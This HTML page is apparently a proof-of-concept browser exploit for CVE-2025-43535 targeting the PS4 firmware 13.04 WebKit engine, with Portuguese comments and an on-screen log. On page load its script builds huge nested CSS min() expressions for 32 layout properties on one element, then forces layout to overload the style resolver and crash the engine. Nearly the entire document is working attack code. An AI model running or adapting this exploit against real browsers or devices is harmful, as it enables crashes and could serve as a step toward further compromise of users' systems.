<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535 — Single Node Overload</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px; height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .warn{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<div>CVE-2025-43535 · Sobrecarga de Propriedades · PS4 FW 13.04</div>
<div id="log"></div>
<div id="stage" style="visibility:hidden"></div>

<script>
"use strict";

const L = (m, c) => {
  const d = document.getElementById('log');
  d.innerHTML += `<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop = d.scrollHeight;
};

// Respiro para o Garbage Collector do JS limpar a RAM entre propriedades
const yieldGC = () => new Promise(r => setTimeout(r, 200));

// Constrói a árvore única (Bypass de cache)
function buildUniqueDepth(depth, baseVal) {
  let e = baseVal + 'px';
  for (let d = 1; d <= depth; d++) {
    e = 'min(' + e + ',' + e + ')';
  }
  return e;
}

// 32 Propriedades CSS que afetam diretamente o layout/geometria
const layoutProperties = [
  'width', 'height', 'min-width', 'min-height', 'max-width', 'max-height',
  'margin-top', 'margin-right', 'margin-bottom', 'margin-left',
  'padding-top', 'padding-right', 'padding-bottom', 'padding-left',
  'top', 'right', 'bottom', 'left',
  'border-top-width', 'border-right-width', 'border-bottom-width', 'border-left-width',
  'outline-width', 'flex-basis', 'text-indent', 'letter-spacing',
  'word-spacing', 'column-width', 'column-gap', 'row-gap',
  'border-top-left-radius', 'border-bottom-right-radius'
];

async function run() {
  L('Iniciando Ataque Multi-Propriedade no mesmo nó...', 'warn');

  // Criamos o elemento alvo configurado para garantir que todas as propriedades sejam aplicadas
  const alvo = document.createElement('div');
  alvo.style.position = 'absolute'; // Força top/left a serem lidos
  alvo.style.display = 'flex';      // Força flex-basis e gaps a serem lidos
  alvo.style.borderStyle = 'solid'; // Força border-widths a serem lidos
  document.getElementById('stage').appendChild(alvo);

  L(`Alvo criado. Vamos injetar os 32 chunks nas propriedades de layout...`, 'info');

  for (let i = 0; i < layoutProperties.length; i++) {
    const prop = layoutProperties[i];
    try {
      L(`[${i+1}/32] A calcular ~4.1M nós para a propriedade: ${prop}...`);
      
      // Gera ~36MB no JS com base única (ex: 1px, 2px, 3px)
      let uniquePayload = buildUniqueDepth(22, i + 1);
      
      // Anexa diretamente ao estilo em linha (Inline Style) do elemento
      alvo.style.setProperty(prop, uniquePayload);
      
      // APAGA a string do JS. O C++ já guardou a propriedade no CSSOM.
      uniquePayload = null; 
      
      // Dá tempo para o Garbage Collector limpar a RAM do JS
      await yieldGC();
      
    } catch(e) {
      L(`Falha crítica na injeção da propriedade ${prop}: ${e}`, 'fail');
      break;
    }
  }

  L('1GB de árvores matemáticas acumulado no C++ do elemento alvo!', 'warn');
  L('A forçar o Style Resolver a calcular TUDO EM SIMULTÂNEO...', 'crash');
  
  setTimeout(() => {
    try {
      // O GATILHO: O WebKit tem de ler e calcular as 32 propriedades ao mesmo tempo
      // para nos dar a largura final. Isto vai estourar o limite de 119.5M de nós!
      void alvo.offsetWidth; 
      
      L('Sobreviveu. O motor C++ otimizou o inline-style.', 'fail');
    } catch(e) {
      L('Erro no layout: ' + e, 'fail');
    }
  }, 500);
}

window.addEventListener('load', () => setTimeout(run, 500));
</script>
</body>
</html>
